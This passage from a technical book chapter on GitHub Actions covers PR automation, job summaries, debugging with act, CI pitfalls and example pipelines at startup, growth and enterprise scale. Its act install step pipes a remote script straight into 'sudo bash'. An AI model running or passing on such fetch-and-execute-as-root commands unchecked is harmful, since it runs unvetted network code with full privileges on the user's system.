          npm run test:integration
```

### 12.5 PR Labeling and Auto-Merge

Automate the mechanical parts of PR management so humans can focus on the substantive parts:

```yaml
name: PR Automation

on:
  pull_request:
    types: [opened, synchronize, labeled]

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
          # Labels based on .github/labeler.yml path rules

  auto-merge-dependabot:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: dependabot/fetch-metadata@v2
        id: metadata
      - if: steps.metadata.outputs.update-type == 'version-update:semver-patch'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

Patch-version Dependabot PRs auto-merge after CI passes. You never manually merge a `lodash 4.17.21 → 4.17.22` PR again.

### 12.6 Job Summaries

Write rich Markdown summaries visible in the workflow run UI. This is the difference between a CI result that tells you "failed" and one that tells you exactly what failed and how bad it is:

```yaml
- name: Generate test summary
  if: always()
  run: |
    echo "## Test Results" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "| Suite | Passed | Failed | Duration |" >> "$GITHUB_STEP_SUMMARY"
    echo "|-------|--------|--------|----------|" >> "$GITHUB_STEP_SUMMARY"
    echo "| Unit  | 142    | 0      | 23s      |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Integration | 38 | 1   | 1m 45s   |" >> "$GITHUB_STEP_SUMMARY"
    echo "" >> "$GITHUB_STEP_SUMMARY"
    echo "### Coverage: 87.3%" >> "$GITHUB_STEP_SUMMARY"
```

Engineers should not have to hunt through 800 lines of logs to understand why CI failed. Job summaries bring the important information to the surface.

---

## 13. DEBUGGING AND TROUBLESHOOTING

### 13.1 Debug Logging

Enable verbose logging by setting repository secrets:

| Secret | Effect |
|--------|--------|
| `ACTIONS_STEP_DEBUG` = `true` | Verbose step output (each action's debug logs) |
| `ACTIONS_RUNNER_DEBUG` = `true` | Runner-level debug info (environment, paths, etc.) |

You can also re-run a specific failed job with debug logging enabled from the GitHub UI (Re-run jobs → Enable debug logging). This is the fastest path from "CI failed mysteriously" to "I know exactly what happened."

### 13.2 Local Testing with act

```bash
# Install
brew install act                              # macOS
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash  # Linux

# Run the default event (push)
act

# Run pull_request event
act pull_request

# Run a specific job
act -j test

# List all jobs without running them
act -l

# Use secrets from a file
act --secret-file .env.ci

# Use a specific platform image (default is slim, may be missing tools)
act -P ubuntu-latest=catthehacker/ubuntu:full-latest
```

**Limitations of act:**
- No service containers (Postgres, Redis) — use `docker-compose` alongside.
- No OIDC tokens.
- No GitHub API features (pull_request context is mocked).
- Some actions behave differently (especially ones using runner-specific paths).

Use `act` for fast feedback on workflow syntax and step logic. Validate on real GitHub runners for the final pass. The mental model: `act` is your local integration test; GitHub is your staging environment.

### 13.3 Common Pitfalls

**Permission errors:**

```
Error: Resource not accessible by integration
```

The `GITHUB_TOKEN` lacks permissions for the API call. Add the required permission scope to the job. This is almost always the solution — check the permissions table in §2.5.

**Cache misses:**

Caches are scoped to the branch. A PR branch can read caches from the base branch, but not from other PR branches. If you consistently miss cache on PRs, ensure main branch runs populate the cache first. The pattern: cache on main, read on PRs.

**Service container networking:**

Inside a workflow, service containers are accessible at `localhost:<port>` on the runner. But if you run tests inside a Docker container (e.g., `container: node:22`), service containers are accessible at their service name (e.g., `postgres:5432`), not `localhost`. This trips up nearly every engineer the first time.

**Checkout depth:**

If your build needs git history (e.g., for changelogs, version detection, or `git diff`), set `fetch-depth: 0`. The default `fetch-depth: 1` only fetches the latest commit. Turborepo and Nx affected commands both require full history.

**Expression syntax in `if:`:**

```yaml
# These are NOT the same:
if: github.ref == 'refs/heads/main'         # Correct
if: ${{ github.ref == 'refs/heads/main' }}   # Also correct
if: github.ref == refs/heads/main            # WRONG: unquoted string
```

### 13.4 "Works Locally, Fails in CI" Checklist

This is the universal developer frustration. When something passes on your machine but fails in CI, check these in order:

1. **Environment variables:** Is an env var set locally but not in CI? Check `.env` files vs secrets configuration.
2. **Node/Python/Go version:** Local version might differ from CI. Pin versions explicitly.
3. **OS differences:** macOS locally vs Linux in CI. Path separators, case sensitivity, pre-installed tools all differ.
4. **File ordering:** Some OS/FS combinations return files in different orders. If tests depend on file order, they will flake.
5. **Network access:** Local tests hit real services. CI might need service containers or mocks.
6. **Time zones:** Runner uses UTC. Your machine uses local time. If tests depend on "today", they might fail near midnight UTC.
7. **Disk space:** CI runners have limited storage. Large builds, Docker images, or test fixtures can fill the disk.
8. **Permissions:** Files might have different permission bits. Git does not preserve all Unix permissions.
9. **Concurrent access:** If multiple tests write to the same file or port, CI's different timing might expose race conditions that don't surface locally.
10. **Cache pollution:** Running `npm ci` locally uses your global npm cache. CI might have stale or empty caches.

Work through this list systematically before reaching for the nuclear option of adding `ACTIONS_RUNNER_DEBUG=true`.

---

## 14. THE 100X CI/CD PIPELINE

### 14.1 What a Mature Pipeline Looks Like

A mature CI/CD pipeline is not a workflow file. It is a system — interconnected workflows, reusable components, organizational policies, and cultural norms around how code moves from engineer laptop to production.

The sign of a truly mature pipeline is that merging to main is boring. Not exciting. Not stressful. Boring. The automation handles everything correctly every time, and the humans only get involved for genuinely human decisions.

Here is what that looks like at different scales.

### 14.2 Startup Pipeline (Speed Over Everything)

When you have 1-5 engineers, keep it simple. The biggest mistake startups make is over-engineering CI before they have a validated product. One workflow. Under 50 lines. Ship fast.

```yaml
# .github/workflows/ci.yml — The only workflow you need
name: CI/CD

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read
  id-token: write

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test
      - run: npm run build

  deploy:
    needs: ci
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: us-east-1
      - run: npm ci && npm run build
      - run: ./scripts/deploy.sh
```

**Properties:** Single file. Under 50 lines. Deploys on merge to main. OIDC from day one. Total runtime: ~4 minutes.

Start here. Resist the urge to add matrix strategies, reusable workflows, and compliance gates before you need them. Complexity is debt; build it when you have a real problem.

### 14.3 Growth Pipeline (10-50 Engineers)

At this scale, you have a monorepo, multiple services, and engineers who are blocked when CI runs take 12 minutes for every change. Add reusable workflows, change detection, and multiple environments:

```yaml
# .github/workflows/ci.yml — Caller workflow
name: CI

on:
  pull_request:
    branches: [main]

permissions: {}

jobs:
  detect:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'apps/api/**'
              - 'packages/shared/**'
            web:
              - 'apps/web/**'
              - 'packages/shared/**'
              - 'packages/ui/**'

  api-ci:
    needs: detect
    if: needs.detect.outputs.api == 'true'
    uses: ./.github/workflows/node-ci-reusable.yml
    with:
      working_directory: 'apps/api'
      run_e2e: true
    secrets: inherit

  web-ci:
    needs: detect
    if: needs.detect.outputs.web == 'true'
    uses: ./.github/workflows/node-ci-reusable.yml
    with:
      working_directory: 'apps/web'
      run_e2e: false
    secrets: inherit
```

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy-staging:
    uses: ./.github/workflows/deploy-reusable.yml
    with:
      environment: staging
      aws_role: ${{ vars.STAGING_AWS_ROLE }}
    secrets: inherit

  smoke-tests:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run test:smoke -- --base-url=${{ needs.deploy-staging.outputs.url }}

  deploy-production:
    needs: smoke-tests
    uses: ./.github/workflows/deploy-reusable.yml
    with:
      environment: production
      aws_role: ${{ vars.PRODUCTION_AWS_ROLE }}
    secrets: inherit
```

**Properties:** Reusable workflows. Change detection. Staging → smoke tests → production. OIDC with environment-scoped roles. CI only runs for affected packages. The CSS engineer's PR runs in 90 seconds.

### 14.4 Enterprise Pipeline (100+ Engineers)

At enterprise scale, add compliance gates, self-hosted runners, and cross-repo orchestration. The pipeline is now a system with its own governance:

```yaml
# In org/shared-workflows repo
# .github/workflows/enterprise-ci.yml
name: Enterprise CI (Reusable)

on:
  workflow_call:
    inputs:
      service_name:
        type: string
        required: true
      compliance_level:
        type: string
        default: 'standard'  # standard, pci, hipaa
      deploy_target:
        type: string
        default: 'ecs'

jobs:
  security-scan:
    runs-on: [self-hosted, linux, x64]
    steps:
      - uses: actions/checkout@v4
      - name: SAST scan
        uses: github/codeql-action/analyze@v3
      - name: Dependency scan
        run: npm audit --production --audit-level=high
      - name: Container scan
        if: inputs.deploy_target == 'ecs'
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'

  compliance-gate:
    needs: security-scan
    if: inputs.compliance_level != 'standard'
    runs-on: [self-hosted, linux, x64]
    steps:
      - name: PCI DSS checks
        if: inputs.compliance_level == 'pci'
        run: ./scripts/compliance/pci-check.sh
      - name: HIPAA checks
        if: inputs.compliance_level == 'hipaa'
        run: ./scripts/compliance/hipaa-check.sh
      - name: Generate audit trail
        run: |
          cat >> "$GITHUB_STEP_SUMMARY" << EOF
          ## Compliance Report
          - **Service:** ${{ inputs.service_name }}
          - **Level:** ${{ inputs.compliance_level }}
          - **Commit:** ${{ github.sha }}
          - **Actor:** ${{ github.actor }}
          - **Timestamp:** $(date -u +"%Y-%m-%dT%H:%M:%SZ")
          - **Status:** Passed
          EOF

  deploy:
    needs: [security-scan, compliance-gate]
    if: always() && needs.security-scan.result == 'success' && (needs.compliance-gate.result == 'success' || needs.compliance-gate.result == 'skipped')
    runs-on: [self-hosted, linux, x64]
    environment: production
    steps:
      - uses: actions/checkout@v4
      - name: Deploy with audit logging
        run: |
          ./scripts/deploy.sh \
            --service ${{ inputs.service_name }} \
            --commit ${{ github.sha }} \
            --actor ${{ github.actor }} \
            --run-id ${{ github.run_id }}
```

**Properties:** Self-hosted runners for network access and compliance tooling. Mandatory security scanning. Compliance gates for regulated services. Full audit trail in job summaries. Cross-repo reusable workflows that every team in the org inherits automatically.

### 14.5 Reference Architecture

```
                    ┌─────────────────────────────────────────┐
                    │            PR Opened / Updated           │
                    └──────────────────┬──────────────────────┘
                                       │
                    ┌──────────────────▼──────────────────────┐
                    │          Change Detection                │
                    │   (dorny/paths-filter or turbo affected) │
                    └──┬───────────┬───────────┬──────────────┘
                       │           │           │
              ┌────────▼──┐  ┌────▼─────┐  ┌──▼──────────┐
              │  API CI   │  │  Web CI  │  │  Shared CI  │
              │(reusable) │  │(reusable)│  │ (reusable)  │
              └────────┬──┘  └────┬─────┘  └──┬──────────┘
                       │         │            │
                       └────┬────┘────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │        All Checks Pass            │
              │    (required status checks)       │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │         Merge to Main             │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │     Deploy to Staging (auto)      │
              │        (OIDC credentials)         │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │      Smoke Tests on Staging       │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │   Deploy to Production (gated)    │
              │   (required reviewer approval)    │
              │        (OIDC credentials)         │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │    Post-Deploy Health Checks      │
              │   (automatic rollback on fail)    │
              └──────────────────────────────────┘
```

### 14.6 Key Metrics to Track

| Metric | Startup Target | Growth Target | Enterprise Target |
|--------|---------------|---------------|-------------------|
| PR CI duration | < 5 min | < 8 min | < 12 min |
| Deploy to staging | < 3 min | < 5 min | < 10 min |
| Deploy to production | < 5 min | < 10 min | < 15 min |
| CI flake rate | < 2% | < 1% | < 0.5% |
| MTTR (deploy fix) | < 15 min | < 15 min | < 30 min |
| Secret rotation | OIDC (auto) | OIDC (auto) | OIDC + Vault |

If your pipeline is hitting these targets, merging to main is boring. And boring CI is exactly what you want.

---

## KEY TAKEAWAYS

1. **Path filtering is free performance.** In a monorepo, only run CI for what changed. This alone can cut runner costs 50-80% and make engineers trust CI results again.

2. **OIDC federation is non-negotiable.** Stop storing cloud credentials as GitHub secrets. OIDC gives you automatic rotation, fine-grained scope, and audit trails — and eliminates the entire class of "leaked long-lived key" incidents.

3. **Reusable workflows and composite actions eliminate copy-paste.** Standardize your pipeline once, share it across every repo. Updates propagate from one place. The 12-repo update becomes a one-PR update.

4. **Pin actions by SHA.** Tags are mutable. A compromised action can steal your secrets. SHA pinning with Dependabot auto-updates is the right balance of security and maintenance.

5. **Set permissions to minimal.** Start with `permissions: {}` at the top level and grant per-job. The principle of least privilege applies to CI tokens as much as to IAM roles.

6. **Always set timeouts.** A hung job burns runner minutes for 6 hours by default. Set `timeout-minutes` on every job. This is the simplest thing you can do that costs nothing and saves real money.

7. **Measure CI performance.** Track duration, flake rate, and cost weekly. If you cannot measure it, you cannot improve it — and CI duration is one of the most direct levers on developer productivity.

8. **Treat CI as code.** Review workflow changes. Use CODEOWNERS. Test with `act`. Version reusable workflows. Your CI pipeline is production infrastructure — engineer it with the same rigor as your application. The team that does this ships faster, sleeps better, and never spends a Friday babysitting a deployment.

---

*Next: Chapter 34 explores spec-driven development — writing the specification before the code, from RFCs and OpenAPI contracts to AI-native specs that serve as the interface between human intent and machine execution.*

---

## Try It Yourself

Want to put this into practice? The [TicketPulse course](../course/) has hands-on modules that build on these concepts:

- **[L1-M15: CI/CD Pipeline](../course/modules/loop-1/L1-M15-ci-cd-pipeline.md)** — Build TicketPulse's first working CI pipeline from zero, including test, lint, and deploy steps
- **[L2-M55a: GitHub Actions Mastery](../course/modules/loop-2/L2-M55a-github-actions-mastery.md)** — Refactor a flat workflow into reusable components, add matrix builds, and implement proper secret management
- **[L3-M80a: GitHub Actions at Scale](../course/modules/loop-3/L3-M80a-github-actions-at-scale.md)** — Harden a production CI system with OIDC federation, self-hosted runners, and cost controls

### Quick Exercises

1. **Convert one copy-pasted workflow into a reusable workflow** — identify a `steps` block that appears in more than one workflow file and extract it into a shared workflow callable via `workflow_call`. Measure the diff in total line count.
2. **Add OIDC federation to replace one stored secret** — remove a long-lived AWS or GCP credential from your repository secrets and replace it with a short-lived token via OIDC. Verify the old secret can be deleted.
3. **Measure your CI time and add one parallelization optimization** — find your slowest job, split its steps into parallel jobs where possible, and compare before/after wall-clock time.
